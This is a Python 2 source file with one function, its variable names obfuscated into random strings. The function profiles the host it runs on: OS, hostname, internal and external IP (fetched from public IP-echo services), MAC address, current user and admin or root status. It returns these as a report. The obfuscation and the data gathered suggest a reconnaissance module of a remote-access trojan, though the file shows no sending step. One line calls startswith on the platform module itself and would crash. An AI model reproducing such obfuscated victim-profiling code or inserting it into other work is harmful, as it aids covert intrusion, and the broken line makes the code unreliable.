# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def pNKTPPqkGzrmqhneYrAXlKTwcMiQhwMR(plat_type):
    YGdrhGAyjfgcuypmZVeJSlugbzDhKVyI = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    xHsIFnZPzfaUJYdoOKBrYgGNGqyfQtVo = getpass.getuser()
    lVPrLEGrytyKcAreDjSGTBLuQRRyUwqS    = socket.gethostname()
    kHCJiVtDBpYrqgKvpZYybPChnbsFtMaC        = socket.getfqdn()
    gvZxhMxSOOvXgwoLINxYjhVGgWlmNvJm = socket.gethostbyname(lVPrLEGrytyKcAreDjSGTBLuQRRyUwqS)
    wkkIuryOVQwzOuFCkTnzIcZPusAjnNMt     = uuid.getnode()
    dUkeZswZHwJyvDuWHAKDRPlWHzgykTMI         = ':'.join(("%012X" % wkkIuryOVQwzOuFCkTnzIcZPusAjnNMt)[oaUVjRZSEqOiYdoDRRraRJNSStGiPkYI:oaUVjRZSEqOiYdoDRRraRJNSStGiPkYI+2] for oaUVjRZSEqOiYdoDRRraRJNSStGiPkYI in range(0, 12, 2))
    sYTSMQCoyQvoYfcpbmEWqfJKEtoBcGFf = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    ZrYAjQorRspjxAMCyCjiUrwIOIUDoCDS = ''
    for HiJzpfxOqMnOohWJImURiUzCtymUmfjZ in sYTSMQCoyQvoYfcpbmEWqfJKEtoBcGFf:
        try:
            ZrYAjQorRspjxAMCyCjiUrwIOIUDoCDS = urllib.urlopen('http://'+HiJzpfxOqMnOohWJImURiUzCtymUmfjZ).read().rstrip()
        except IOError:
            pass
        if ZrYAjQorRspjxAMCyCjiUrwIOIUDoCDS and (6 < len(ZrYAjQorRspjxAMCyCjiUrwIOIUDoCDS) < 16):
            break
    RxjhTRAZnfqURCqFbYtDvUwcovKLXbmp = False
    if plat_type.startswith('win'):
        RxjhTRAZnfqURCqFbYtDvUwcovKLXbmp = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        RxjhTRAZnfqURCqFbYtDvUwcovKLXbmp = os.getuid() == 0
    aRyojSjrkFVBroufwrPJRFOXGFYyxbQA = 'Yes' if RxjhTRAZnfqURCqFbYtDvUwcovKLXbmp else 'No'
    vqqUnjoccziwgEYdUaFPcEDXuYkxVcOp = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(YGdrhGAyjfgcuypmZVeJSlugbzDhKVyI, processor, architecture,
    lVPrLEGrytyKcAreDjSGTBLuQRRyUwqS, kHCJiVtDBpYrqgKvpZYybPChnbsFtMaC, gvZxhMxSOOvXgwoLINxYjhVGgWlmNvJm, ZrYAjQorRspjxAMCyCjiUrwIOIUDoCDS, dUkeZswZHwJyvDuWHAKDRPlWHzgykTMI, xHsIFnZPzfaUJYdoOKBrYgGNGqyfQtVo, aRyojSjrkFVBroufwrPJRFOXGFYyxbQA)
    return vqqUnjoccziwgEYdUaFPcEDXuYkxVcOp
